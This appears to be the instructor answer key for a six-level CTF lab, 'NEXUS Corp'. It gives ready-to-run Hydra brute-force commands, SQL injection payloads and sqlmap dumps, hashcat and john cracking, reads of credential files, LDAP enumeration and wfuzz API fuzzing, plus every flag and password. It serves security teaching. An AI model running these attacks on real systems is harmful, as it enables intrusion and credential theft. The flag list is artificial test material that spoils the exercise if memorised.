# NEXUS Corp CTF — Walkthrough 🔑

> ⚠️ **SPOILERS AHEAD** — This is the solution guide for instructors and developers.
> Do NOT share with participants.

---

## Level 1: Employee Portal (Brute-force)

**Flag:** `NEXUS{w3lc0m3_t0_th3_c0rp_7a3b}`

**Solution:** The admin account has credentials `admin:admin`.

**With Hydra:**
```bash
# Identify the form fields by inspecting the HTML or using curl
curl -X POST http://TARGET:5000/level/1/login \
  -d "username=test&password=test"

# Brute-force with Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  TARGET http-post-form \
  "/level/1/login:username=^USER^&password=^PASS^:Login failed"
```

**Manual:** Just try `admin` / `admin` in the form.

**Other valid credentials:**
- `guest:guest`, `root:toor`, `dbadmin:dbadmin` — but only `admin` has Administrator role.

---

## Level 2: HR Database (SQL Injection)

**Flag:** `NEXUS{sql_1nj3ct10n_m4st3r_9f2d}`

**Solution:** The search field at `/level/2/search` is vulnerable to SQL injection.

**Manual SQLi:**
```
' OR 1=1 --                    → Dump all hr_employees
' UNION SELECT 1,2,3,4 --     → Test column count
' UNION SELECT name,sql,3,4 FROM sqlite_master --  → List all tables
' UNION SELECT id,hostname,username,password_hash FROM ssh_credentials --  → Extract SSH hashes
```

**With sqlmap:**
```bash
# Basic enumeration
sqlmap -u "http://TARGET:5000/level/2/search?search=test" --tables

# Dump the hidden table
sqlmap -u "http://TARGET:5000/level/2/search?search=test" \
  -T ssh_credentials --dump
```

**Key discovery:** The `ssh_credentials` table contains:
| hostname | username | password_hash | type |
|----------|----------|---------------|------|
| nexus-internal-srv | sysop | `5b09b6e080c821e463c2b48bc81540f3` | MD5 |
| nexus-backup-srv | backup | `a67c4d15c47b4899e4a71024acf4aaa2` | MD5 |
| nexus-dev-srv | devops | (SHA256 hash) | SHA256 |

The flag must be submitted manually — it's not auto-returned by SQLi.

---

## Level 3: Hash Cracking

**Flag:** `NEXUS{h4sh_cr4ck3d_w1d3_0p3n_6e1a}`

**Solution:** Crack the MD5 hash for the `sysop` account.

**Hash:** `5b09b6e080c821e463c2b48bc81540f3`
**Password:** `Op3r4t0r!`

**With Hashcat:**
```bash
echo "5b09b6e080c821e463c2b48bc81540f3" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
# -m 0 = MD5
```

**With John the Ripper:**
```bash
echo "5b09b6e080c821e463c2b48bc81540f3" > hash.txt
john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Submit `Op3r4t0r!` at `/level/3/verify` to get the flag.

---

## Level 4: SSH Infiltration

**Flag:** `NEXUS{ssh_tun3l_r4t_1n_th3_w4lls_2c8f}`

**Solution:** SSH into the simulated server with `sysop:Op3r4t0r!` and explore.

**Steps:**
1. Login with `sysop` / `Op3r4t0r!`
2. Explore with these commands:
```bash
ls                          # List home directory
cat notes.txt               # LDAP server info, vault hints
cat .bash_history           # Commands revealing LDAP usage
cat /etc/nexus/ldap.conf    # LDAP config (anonymous bind enabled!)
cat /etc/nexus/backup.key   # LDAP admin password: Ldap@dm1n_2024
cat /tmp/debug_dump.txt     # THE FLAG IS HERE
```

**Key information gathered for Level 5:**
- LDAP server: `ldap://nexus-ldap-srv:389`
- Base DN: `dc=nexuscorp,dc=local`
- Anonymous bind: enabled
- Admin DN: `cn=admin,dc=nexuscorp,dc=local`
- Admin password: `Ldap@dm1n_2024`
- Vault requires `clearance_level >= 5`
- Service account: `vault_svc`

---

## Level 5: LDAP Enumeration

**Flag:** `NEXUS{ld4p_3num3r4t10n_pr0_5d7b}`

**Solution:** Query the LDAP directory, authenticate as admin to see password hashes.

**Step 1 — Anonymous query (see entries, hashes redacted):**
- Bind DN: (leave empty)
- Bind Password: (leave empty)
- Filter: `(objectClass=*)`
- Attributes: `*`

**Step 2 — Admin query (reveals hashes + flag):**
- Bind DN: `cn=admin,dc=nexuscorp,dc=local`
- Bind Password: `Ldap@dm1n_2024`
- Filter: `(objectClass=*)`
- Attributes: `*`

**Key discovery:** `vault_svc` entry:
- uid: `vault_svc`
- clearance_level: 5
- userPassword (SHA256): hash of `V4ult_M4st3r_K3y!`

The SHA256 hash is: the output of `hashlib.sha256(b"V4ult_M4st3r_K3y!").hexdigest()`
= `7887cb046d8425acd8a0e48bde7cfa387382ac06a086a471faec90d0f0d17026`

(actual value generated at runtime by Python)

---

## Level 6: Vault API Fuzzing (WFUZZ)

**Flag:** `NEXUS{fuzz_th3_v4ult_ap1_d1sc0v3r3d_8k2m}`

**Solution:** Use the cracked vault_svc password as an API token, then fuzz the vault API in two phases.

**Prerequisites:** Crack vault_svc's SHA256 hash from Level 5.

```bash
echo "<sha256_hash_from_level5>" > vault_hash.txt
hashcat -m 1400 vault_hash.txt /usr/share/wordlists/rockyou.txt
# Cracked password: V4ult_M4st3r_K3y!
```

**Step 1 — Download the wordlist:**
```bash
wget http://TARGET:5000/level/6/api-wordlist.txt -O api-wordlist.txt
```

**Step 2 — Phase 1: Discover API endpoints:**
```bash
wfuzz -w api-wordlist.txt --hc 404 \
  -H "X-Vault-Token: V4ult_M4st3r_K3y!" \
  http://TARGET:5000/level/6/vault-api/FUZZ
```

This reveals valid endpoints: `status` (200), `health` (200), `config` (403), `logs` (200), `backup` (200), `archives` (200).

**Step 3 — Inspect the interesting endpoint:**

Hit `archives` manually or via curl:
```bash
curl -s -H "X-Vault-Token: V4ult_M4st3r_K3y!" \
  http://TARGET:5000/level/6/vault-api/archives
```
Response includes `"total_classified": 95` and `"message": "Specify doc_id parameter..."`.

**Bonus clue:** The `logs` endpoint shows `"action": "doc_retrieved", "doc_id": 73` — a breadcrumb for sharp-eyed players.

**Step 4 — Phase 2: Fuzz doc_id parameter:**

First, run a baseline request to see the "not found" word count:
```bash
curl -s -H "X-Vault-Token: V4ult_M4st3r_K3y!" \
  "http://TARGET:5000/level/6/vault-api/archives?doc_id=1"
# Returns: {"doc_id":"1","error":"Document not found","status":"restricted"}
```

Then fuzz the range, hiding the common word count:
```bash
wfuzz -z range,1-95 --hw 7 \
  -H "X-Vault-Token: V4ult_M4st3r_K3y!" \
  "http://TARGET:5000/level/6/vault-api/archives?doc_id=FUZZ"
```

> **Note:** The exact `--hw` value depends on Flask's JSON formatting. The player should
> first run without `--hw`, observe the common word count in the output, then re-run with
> `--hw <common_count>` to filter. Alternatively, use `--hh` to filter by character count.

Only `doc_id=73` returns a different response (many more words/chars) containing the classified
CEO vault documents. The flag is inside `Project_Chimera_Financials.pdf`:

`NEXUS{fuzz_th3_v4ult_ap1_d1sc0v3r3d_8k2m}`

**WFUZZ flags used:**
| Flag | Purpose |
|------|---------|
| `-w <file>` | Wordlist file for payloads |
| `-z range,1-95` | Generate numeric range as payloads |
| `FUZZ` | Placeholder replaced by each payload |
| `--hc 404` | Hide 404 responses (Phase 1) |
| `--hw N` | Hide responses with N words (Phase 2) |
| `-H "Key: Val"` | Custom HTTP header for API authentication |

---

## All Flags Summary

| Level | Flag |
|-------|------|
| 1 | `NEXUS{w3lc0m3_t0_th3_c0rp_7a3b}` |
| 2 | `NEXUS{sql_1nj3ct10n_m4st3r_9f2d}` |
| 3 | `NEXUS{h4sh_cr4ck3d_w1d3_0p3n_6e1a}` |
| 4 | `NEXUS{ssh_tun3l_r4t_1n_th3_w4lls_2c8f}` |
| 5 | `NEXUS{ld4p_3num3r4t10n_pr0_5d7b}` |
| 6 | `NEXUS{fuzz_th3_v4ult_ap1_d1sc0v3r3d_8k2m}` |
